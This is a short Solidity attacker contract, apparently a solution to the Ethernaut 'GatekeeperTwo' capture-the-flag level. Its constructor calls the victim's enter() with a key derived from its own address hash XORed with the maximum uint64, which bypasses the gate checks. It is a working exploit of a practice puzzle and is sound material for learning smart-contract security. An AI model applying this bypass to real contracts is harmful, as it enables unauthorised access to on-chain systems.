// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IGatekeeperTwoEneter {
        function enter(bytes8 _gateKey) external returns (bool);
}
contract GatekeeperTwoAttacker{
    
    constructor(address _victimContractAddress){
        address victimContractAddress = _victimContractAddress;
        IGatekeeperTwoEneter(victimContractAddress).enter(getGateThreeKey());

    }
    function getGateThreeKey()public  view returns(bytes8){
        return bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  type(uint64).max);
    }

}